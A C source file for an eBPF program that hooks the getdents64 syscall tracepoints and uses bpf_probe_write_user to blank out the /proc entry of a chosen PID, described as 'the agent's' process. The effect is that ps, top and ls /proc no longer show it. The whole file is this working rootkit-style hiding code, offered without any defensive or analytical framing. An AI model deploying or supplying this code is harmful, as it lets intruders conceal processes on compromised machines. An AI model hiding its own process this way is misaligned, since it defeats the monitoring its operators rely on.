/*
 * hide_process.bpf.c — eBPF program to hide a process from /proc listings.
 *
 * Hooks sys_exit_getdents64 to filter out the agent's PID directory entry
 * from /proc directory listings.  When a userspace tool (ps, top, ls /proc)
 * calls getdents64, the exit tracepoint fires and this program walks the
 * returned dirent64 buffer, zeroing out the d_name of the entry matching
 * the agent's PID (stored in pid_map).
 *
 * The companion sys_enter_getdents64 program stashes the buffer pointer
 * in buf_stash so the exit program can access it.
 *
 * Attach types:
 *   tracepoint/syscalls/sys_enter_getdents64
 *   tracepoint/syscalls/sys_exit_getdents64
 *
 * Maps:
 *   pid_map   — BPF_MAP_TYPE_ARRAY(1): u32 key → u32 value (PID to hide)
 *   buf_stash — BPF_MAP_TYPE_PERCPU_ARRAY(1): u32 key → u64 value (buf ptr)
 *
 * Kernel requirement: >= 4.15 (BPF_PROG_TYPE_TRACEPOINT).
 */

#include <linux/bpf.h>
#include <linux/types.h>
#include <bpf/bpf_helpers.h>

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} pid_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u64);
} buf_stash SEC(".maps");

/* linux_dirent64 layout — must match kernel ABI. */
struct linux_dirent64 {
    __u64  d_ino;
    __u64  d_off;
    __u16  d_reclen;
    __u8   d_type;
    char   d_name[];
};

/* Tracepoint argument structures. */
struct sys_enter_getdents64_args {
    unsigned short common_type;
    unsigned char  common_flags;
    unsigned char  common_preempt_count;
    int            common_pid;
    int            __syscall_nr;
    unsigned int   fd;
    const struct linux_dirent64 *dirent;
    unsigned int   count;
};

struct sys_exit_getdents64_args {
    unsigned short common_type;
    unsigned char  common_flags;
    unsigned char  common_preempt_count;
    int            common_pid;
    int            __syscall_nr;
    long           ret;
};

SEC("tracepoint/syscalls/sys_enter_getdents64")
int stash_buf_ptr(struct sys_enter_getdents64_args *ctx)
{
    __u32 key = 0;
    __u64 val = (__u64)(unsigned long)ctx->dirent;
    bpf_map_update_elem(&buf_stash, &key, &val, BPF_ANY);
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int filter_pid(struct sys_exit_getdents64_args *ctx)
{
    if (ctx->ret <= 0)
        return 0;

    __u32 key = 0;
    __u32 *hide_pid = bpf_map_lookup_elem(&pid_map, &key);
    if (!hide_pid || *hide_pid == 0)
        return 0;

    __u64 *buf_ptr = bpf_map_lookup_elem(&buf_stash, &key);
    if (!buf_ptr)
        return 0;

    /* Convert PID to decimal string. */
    char pid_str[16] = {};
    __u32 pid = *hide_pid;
    int len = 0;
    __u32 tmp = pid;
    while (tmp > 0 && len < 15) {
        pid_str[len++] = '0' + (char)(tmp % 10);
        tmp /= 10;
    }
    for (int i = 0; i < len / 2; i++) {
        char c = pid_str[i];
        pid_str[i] = pid_str[len - 1 - i];
        pid_str[len - 1 - i] = c;
    }
    pid_str[len] = '\0';

    struct linux_dirent64 *dir = (struct linux_dirent64 *)(unsigned long)(*buf_ptr);
    int bpos = 0;
    int total = (int)ctx->ret;

    /*
     * Walk the dirent buffer.  Up to 256 iterations covers most /proc
     * listings (there are typically < 500 entries).
     */
    for (int i = 0; i < 256; i++) {
        if (bpos + (int)sizeof(struct linux_dirent64) > total)
            break;

        struct linux_dirent64 *cur = (void *)dir + bpos;
        __u16 reclen = 0;
        if (bpf_probe_read_user(&reclen, sizeof(reclen), &cur->d_reclen) < 0)
            break;
        if (reclen == 0)
            break;

        if (reclen > 256)
            goto next;

        /* Read the name field. */
        char name[32] = {};
        if (bpf_probe_read_user_str(name, sizeof(name), &cur->d_name) <= 0)
            goto next;

        /* Compare name with pid_str. */
        int match = 1;
        for (int j = 0; j < len && j < 31; j++) {
            if (name[j] != pid_str[j]) {
                match = 0;
                break;
            }
        }
        if (match && len < 32 && name[len] != '\0')
            match = 0;

        if (match) {
            /* Zero the name to hide this entry from directory listing. */
            char zero_name[32] = {};
            bpf_probe_write_user(&cur->d_name, 16, zero_name);
        }
    next:
        bpos += reclen;
    }

    return 0;
}

char _license[] SEC("license") = "GPL";
